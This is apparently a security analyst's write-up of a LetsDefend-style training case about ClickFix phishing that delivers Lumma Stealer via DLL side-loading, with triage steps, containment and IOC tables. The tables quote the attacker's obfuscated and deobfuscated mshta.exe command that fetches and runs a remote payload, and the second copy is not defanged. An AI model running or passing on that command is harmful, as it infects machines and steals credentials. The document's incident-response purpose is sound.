 This attack is a multi-stage process that combines two dangerous techniques to deliver the **Lumma Stealer**, a type of malware that steals information.

Here is the breakdown:

### 1. Click Fix Phishing (The Bait)

* **What it is:** This is a social engineering trick where the attacker makes the victim run a malicious command themselves.
* **How it works:** The victim is usually taken to a compromised website showing a fake error (like a CAPTCHA, a "browser fix," or a technical glitch). The page tells the user to **copy and paste a provided command** (often a hidden or obfuscated PowerShell script) into the Windows Run box (`Win + R`) to "fix" the problem or "verify" they are human.
* **The Deception:** The malicious part of the command is often hidden from view (pushed far to the right), making the visible portion look harmless. The user unknowingly executes the command.

### 2. DLL Side-Loading (The Execution)

* **What it is:** This is a technique where a legitimate, trusted Windows application (like an anti-malware tool or a common utility) is tricked into loading a **malicious Dynamic Link Library (DLL)** file instead of the clean, intended one.
* **How it works:** The malicious command executed in step 1 downloads two files:
    1.  A **legitimate program's executable file (.exe)**.
    2.  A **malicious DLL** renamed to the exact name of the DLL that the legitimate `.exe` is programmed to load.
* **The Result:** When the victim runs the seemingly clean `.exe`, the Windows system loads the malicious DLL first because it's in the same directory. This malicious DLL then secretly loads and runs the **Lumma Stealer** malware, which begins stealing passwords, cryptocurrency wallets, and other sensitive data.

In short, **Click Fix** tricks you into running the initial code, and **DLL Side-Loading** is the stealthy way that code uses a trusted program to launch the final malware (**Lumma Stealer**) without raising suspicion.


# Case Investigation

1. Like always, we first start by taking ownership of the case:

<img width="803" height="424" alt="image" src="https://github.com/user-attachments/assets/780594e1-f52a-4992-a797-d0dfd3021043" />

2. Then we take note of the information we already know:

* When was it sent? - Mar, 13, 2025, 09:44 AM
* What is the email's SMTP address? - 132[.]232[.]40[.]201
* What is the sender address? - update@windows-update[.]site
* What is the recipient address? - dylan@letsdefend.io
* Is the mail content suspicious? - It is suspicious due to the domain (windows-update[.]site) being known for distributing malware. 132[.]232[.]40[.]201 also appears to be linked to malicious activities. The page is displayed with certain buttons that are clickable and others that are not.

   <img width="1238" height="721" alt="image" src="https://github.com/user-attachments/assets/5c103340-7316-4600-ad3b-ad68604cd847" />
   <img width="1238" height="721" alt="image" src="https://github.com/user-attachments/assets/89b977e6-7a59-4f70-bb2d-08d1f4ac2a65" />

* Are there any attachments? - No

4. The email was definitely delivered to the user, because from the browser history we can see him navigating to the website

<img width="854" height="558" alt="image" src="https://github.com/user-attachments/assets/cfecb7d3-5c75-4fb6-b359-6c6143a2acae" />

and then executing the command as shown in the following process that was recorded

<img width="854" height="558" alt="image" src="https://github.com/user-attachments/assets/c3a983ec-9675-4b3f-8ef4-48c03a05622e" />

5. The aforementioned shows that the machine has been contaminated, so we need to contain it:

<img width="854" height="558" alt="image" src="https://github.com/user-attachments/assets/e619daae-fcfa-490a-a1a3-e6e91d545a94" />


6. Now we will take note of IOCs:

| Indicator Type | Value | Context/Source |
| :--- | :--- | :--- |
| **Malicious IP (SMTP)** | `132[.]232[.]40[.]201` | SMTP source of the initial phishing email. |
| **Sender Domain** | `windows-update[.]site` | Highly suspicious domain impersonating official updates. |
| **C2/Payload Domain** | `overcoatpassably[.]shop` | Domain hosting the final execution payload. |
| **C2/Payload URL** | `hXXps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4` | URL for the payload fetched by `mshta.exe`. |
| **Obfuscated Command** | `ms]]]ht]]]a]]].]]]exe hXXps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4` | Command executed by the victim via PowerShell. |
| **Deobfuscated Command**| `mshta[.]exe hXXps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4` | The effective command used to launch the next stage. |
| **Recipient Email** | `dylan@letsdefend[.]io` | The targeted user. |

7. Then we record notes to send off to L2:


1. Case Status & Conclusion

* **Case ID:** [To be assigned by L2/Ticketing System]
* **Case Type:** Email-borne Malware Delivery (Lumma Stealer)
* **Alert Time:** Mar, 13, 2025, 09:44 AM
* **Targeted User:** dylan@letsdefend.io
* **Conclusion:** **True Positive.** The user was successfully lured by a "Click Fix Phishing" technique, leading to the execution of a malicious PowerShell command and subsequent compromise via DLL Side-Loading. The endpoint has been **Contained**.



2. Attack Vectors & Techniques

| Technique | Description | Status |
| :--- | :--- | :--- |
| **Phishing/Social Engineering** | Malicious email (sender: `update@windows-update[.]site`) delivered a lure instructing the user to "fix" a browser issue. | Confirmed |
| **Click Fix Execution** | User executed the obfuscated command from the suspicious website in the Windows Run box (`Win + R`). | Confirmed (Browser History & Process Log) |
| **DLL Side-Loading** | Final delivery mechanism utilizing the executed command to fetch a payload that initiates the DLL Side-Loading chain, ultimately launching **Lumma Stealer**. | Confirmed (Based on executed command) |
| **LOLBIN Usage** | The attacker used the Living Off the Land Binary (LOLBIN) **`mshta.exe`** to process and execute the remote payload script. | Confirmed |



3. Confirmed Indicators of Compromise (IOCs)

| Indicator Type | Value | Context/Source |
| :--- | :--- | :--- |
| **Malicious IP (SMTP)** | `132[.]232[.]40[.]201` | SMTP source of the initial phishing email. |
| **Sender Domain** | `windows-update[.]site` | Highly suspicious domain impersonating official updates. |
| **C2/Payload Domain** | `overcoatpassably.shop` | Domain hosting the final execution payload. |
| **C2/Payload URL** | `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | URL for the payload fetched by `mshta.exe`. |
| **Obfuscated Command** | `ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | Command executed by the victim via PowerShell. |
| **Deobfuscated Command** | `mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | The effective command used to launch the next stage. |



4. Next Steps (Tier 2 Escalation)

1.  **Forensics:** Perform a full forensic image of the contained endpoint.
2.  **Scope Hunting:** Search the network and other endpoints for connections to `132[.]232[.]40[.]201` and `overcoatpassably.shop`.
3.  **Remediation:** Analyze the downloaded script/payload to identify persistence mechanisms and perform a thorough clean of **Lumma Stealer** and related files.
